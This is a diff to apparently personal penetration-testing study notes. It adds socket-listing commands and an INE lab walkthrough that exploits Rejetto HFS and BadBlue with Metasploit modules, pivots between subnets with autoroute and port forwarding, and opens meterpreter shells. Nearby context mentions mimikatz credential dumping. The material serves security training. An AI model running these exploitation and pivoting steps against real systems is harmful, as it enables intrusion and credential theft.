@@ -860,8 +860,37 @@ sekurlsa::logonPasswords
 
 5. Pivoting:
 
+#Socket Server
+## Show all TCP sockets
+### Connections
+ss -t
+ 
+### To show listening sockets as well
+ss -t -a
+or
+ss -ta
+
+
+## Show all UDP sockets
+### Connections
+ss -u
+ 
+### To show listening sockets as well
+ss -u -a
+or
+ss -ua
+
+## Show all UNIX sockets
+### Connections
+ss -x
+ 
+# To show listening sockets as well
+ss -x -a
+or
+ss -xa
+
 # Meterpreter
-run autoroute -s <TARGET1_SUBNET_NETWORK>
+run autoroute -s <TARGET1_SUBNET_NETWORK/MASK>
 
 use auxiliary/scanner/portscan/tcp
 set RHOSTS <TARGET2_IP>
@@ -878,6 +907,83 @@ set payload windows/meterpreter/bind_tcp
 set RHOSTS <TARGET2_IP>
 set LPORT <LOCAL_PORT2>
 run
+
+
+# Basic Scenario [INE Lab]:
+https://www.youtube.com/watch?v=r7yuU7nvjSc
+
+Victim Machine 1: 10.10.10.100
+Victim Machine 2: 10.10.20.200
+
+(1) WHICH ONE IS IN OUR NETWORK: 
+ping 10.10.10.100 --> RESPONSE 
+ping 10.10.20.200 --> DIDNT RESPOND
+
+-> Victim Machine 1 is in our network
+-> Victim Machine 2 not in our network
+
+(2) NETWORK MAPPING 
+nmap -sV 10.10.10.100 -p 80,135,139,445,3389
+
+-> HFS 2.3 (rejetto)
+
+(3) AUTOMATED REJETTO HFS EXPLOIT
+msfconsole
+search HFS 2.3
+use exploit/windows/http/rejetto_hfs_exec
+//*
+set RHOSTS 10.10.10.100
+run
+*//
+meterpreter>
+
+-> Machine Compromised !
+
+(4) ICMP TEST TO VICTIM 2
+
+meterpreter> shell
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> ping 10.10.20.200
+-> Success
+
+(5) PIVOTING TIME
+Control+z
+Background channel 2?[y/N] y
+meterpreter> ipconfig
+
+
+meterpreter> run autoroute -s 10.10.10.0/24 [VICTIM_1_NETWORK/MASK]
+meterpreter> run autoroute -p
+Control+z
+Background channel 3?[y/N] y
+use auxiliary/scanner/portscan/tcp
+//*
+set RHOSTS <VICTIM_2_IP>
+set PORTS 1-100
+run
+*//
+
+(6) PORT FORWARDING
+{ ELITE PORT: 31337 }
+
+sessions -i 1
+meterpreter> portfwd add -l 31337 -p 80 -r VICTIM_2_IP
+
+(7) SCANNING VICTIM_2 WITH NMAP VIA OUR ELITE PORT
+nmap -sV -p 31337 localhost
+-> Badblue 2.7 Vulnerability discovered
+
+search badblue
+use exploit/windows/http/badblue_passthru
+//*
+set RHOSTS VICTIM_2_IP
+run
+[!] IMPORTANT : USE BIND SHELL [!] 
+set payload windows/meterpreter/bind_tcp
+*//
+
+meterpreter> shell
+
+
 ----------------------------------------------------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------------------------------------------------
 ----------------------------------------------------------------------------------------------------------------------------------------------
